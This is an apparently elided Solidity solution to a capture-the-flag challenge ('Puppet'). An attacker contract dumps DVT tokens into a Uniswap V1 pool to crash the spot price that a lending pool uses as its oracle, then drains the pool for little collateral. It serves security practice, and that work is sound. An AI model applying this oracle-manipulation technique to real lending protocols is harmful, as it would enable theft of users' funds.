...
contract PuppetAttacker {
    ...
    function attack() external {
        // Use all the player's DVT to push the Uniswap spot price down.
        uint256 playerTokens = token.balanceOf(address(this));

        token.approve(address(uniswapV1Exchange), playerTokens);

        // The lending pool trusts this pool balance as its oracle, so one big
        // token sale makes the required ETH collateral collapse.
        ...
        // With the price distorted, the whole lending pool can be drained
        // using less ETH than the player started with.
...
contract PuppetChallenge is Test {
    ...
    function test_puppet() public checkSolvedByPlayer {
        ...
        // Keep everything inside the player's single transaction: fund the
        // helper contract, then let it manipulate the oracle and borrow.
    ...
    function _calculateTokenToEthInputPrice(
        ...
        uint256 tokensSoldWithFee = tokensSold * 997;
        return
            (tokensSoldWithFee * etherInReserve) /
            (tokensInReserve * 1000 + tokensSoldWithFee);
    }
